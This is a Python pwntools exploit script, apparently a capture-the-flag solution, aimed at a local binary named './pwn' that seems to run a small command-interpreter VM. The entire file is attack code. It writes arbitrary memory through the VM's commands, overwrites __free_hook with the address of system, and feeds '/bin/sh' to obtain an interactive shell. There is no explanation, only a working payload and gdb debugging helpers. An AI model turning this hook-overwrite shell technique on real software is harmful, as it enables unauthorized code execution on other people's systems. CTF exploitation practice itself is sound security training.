#coding=utf-8
from pwn import *
local = 1
exec_file="./pwn"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file,checksec = False)
if local :
    a=process(exec_file)
    if context.arch == "i386" :
        libc=ELF("/lib/i386-linux-gnu/libc.so.6",checksec = False)
    elif context.arch == "amd64" :
        libc=ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec = False) 
else:
    a=remote("")

def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    #text_base,libc_base=get_base(a)
    #script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script='''
    b *0x0000000000400FA0
    b *0x0000000000401EDD
    '''
    gdb.attach(a,script)
def fuck(address):
    n = globals()
    for key,value in n.items():
        if value == address:
            return success(key+"  ==>  "+hex(address))

def SAVE_IN_RAX(value):
    return "1."+p64(value)+"."

def PUSH():
    return "13."
def GET_QWROD():
    return "9."

def MODIFY(addr,value):
    return SAVE_IN_RAX(addr)+PUSH()+SAVE_IN_RAX(value)+"11."


#debug()
RSP = 0x0000000007015D0
fuck_addr = 0x0000000007015D8
system_addr = 0x0000000000420BE0
free_hook = 0x0000000000700EE8

payload = MODIFY(free_hook,1)
payload = MODIFY(free_hook,system_addr)
payload += SAVE_IN_RAX(fuck_addr)
payload += GET_QWROD()
payload += PUSH()
payload += SAVE_IN_RAX(u64("/bin/sh\x00"))
payload += "11."
a.sendline(payload)



a.interactive()









